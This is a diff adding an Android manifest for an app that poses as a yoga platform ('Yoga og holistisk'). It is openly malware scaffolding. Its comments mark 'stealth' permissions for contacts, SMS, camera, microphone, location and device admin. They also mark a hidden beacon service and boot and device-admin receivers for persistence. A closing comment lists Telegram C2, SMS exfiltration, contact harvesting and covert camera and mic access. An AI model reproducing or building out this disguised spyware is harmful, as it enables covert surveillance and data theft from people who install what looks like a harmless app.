@@ -1,0 +1,97 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.yoga.holistisk.platform"
+    android:versionCode="1"
+    android:versionName="2.4.1">
+
+    <!-- Legitime permissions for yoga app -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    
+    <!-- Advanced permissions (stealth) -->
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.DEVICE_ADMIN" />
+
+    <application
+        android:allowBackup="true"
+        android:icon="@drawable/yoga_icon"
+        android:label="Yoga og holistisk"
+        android:theme="@style/AppTheme"
+        android:debuggable="false">
+
+        <activity
+            android:name=".YogaMainActivity"
+            android:label="Yoga Platform"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!-- Hidden beacon service -->
+        <service
+            android:name=".services.YogaUpdateService"
+            android:enabled="true"
+            android:exported="false" />
+
+        <!-- Boot receiver for persistence -->
+        <receiver
+            android:name=".receivers.YogaBootReceiver"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter android:priority="1000">
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.PACKAGE_REPLACED" />
+                <data android:scheme="package" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Network change receiver -->
+        <receiver
+            android:name=".receivers.YogaNetworkReceiver"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Device admin for persistence -->
+        <receiver
+            android:name=".admin.YogaDeviceAdminReceiver"
+            android:permission="android.permission.BIND_DEVICE_ADMIN"
+            android:exported="true">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin_policy" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
+
+    </application>
+</manifest>
+
+<!-- 
+Android Beacon Features:
+- Telegram C2 communication
+- SMS exfiltration  
+- Location tracking
+- Contact harvesting
+- Camera/mic access
+- Persistent through device admin
+- Network change monitoring
+- Boot persistence
+-->
